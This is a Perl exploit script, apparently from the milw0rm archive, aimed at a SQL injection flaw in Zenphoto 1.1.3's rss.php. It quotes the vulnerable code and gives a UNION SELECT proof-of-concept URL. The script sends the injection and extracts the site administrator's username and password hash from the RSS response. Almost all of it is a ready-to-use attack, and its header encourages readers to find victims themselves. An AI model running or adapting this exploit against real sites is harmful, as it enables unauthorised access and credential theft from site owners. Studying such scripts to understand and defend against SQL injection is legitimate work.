#!/usr/bin/perl -w

#################################################################################
#                                                                               #
#                      Zenphoto 1.1.3 SQL Injection Exploit                     #
#                                                                               #
# Discovered by: Silentz                                                        #
# Payload: Admin Username & Hash Retrieval                                      #
# Website: http://www.w4ck1ng.com                                               #
#                                                                               #
# Vulnerable Code (rss.php):                                                    #
#                                                                               #
#      $albumnr = $_GET[albumnr];						#
#      	 									#
#       if ($albumnr != "")							#
#	{ $sql = "SELECT * FROM ". prefix("images") ." WHERE albumid = $albumnr #
#          AND `show` = 1 ORDER BY id DESC LIMIT ".$items;}			#
#        else									#
# 	{ $sql = "SELECT * FROM ". prefix("images") ." WHERE `show` = 1 ORDER 	#
#          BY id DESC LIMIT ".$items; }						#
#                                                                               #
# PoC: http://victim.com/zenphoto/rss.php?albumnr=1 UNION SELECT 0,0,0,(SELECT  #
# value FROM zp_options WHERE id=12),(SELECT value FROM zp_options WHERE id=13) # 
# ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, #
# 0,0,0,0/*	                                                                #
#                                                                               #
# Subject To: Nothing!			                                        #
# GoogleDork: Get your own!                                                     #
#                                                                               #
# Shoutz: The entire w4ck1ng community                                          #
#                                                                               #
# NOTE: The vulnerbility exists in versions 1.1, 1.1.1, 1.1.2 & 1.1.3 BUT you'd #
#       have to alter the payload in order to make it work for any versions     #
#       other than 1.1.3. 							#
#										#
#################################################################################

use LWP::UserAgent;
die "Example: exploit.pl http://victim.com/\n" unless @ARGV;

$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$host = $ARGV[0] . "rss.php?albumnr=1 UNION SELECT 0,0,0,(SELECT value FROM zp_options WHERE id=12),(SELECT value FROM zp_options WHERE id=13),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0/*";

$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content;

if ($answer =~ /<webMaster>(.*?)<\/webMaster>/){
        print "\nBrought to you by w4ck1ng.com...\n";
        print "\n[+] Admin User : $1";
}

if ($answer =~/([0-9a-fA-F]{32})/){print "\n[+] Admin Hash : $1\n\n";}

else{print "\n[-] Exploit Failed...\n";}

# milw0rm.com [2007-12-31]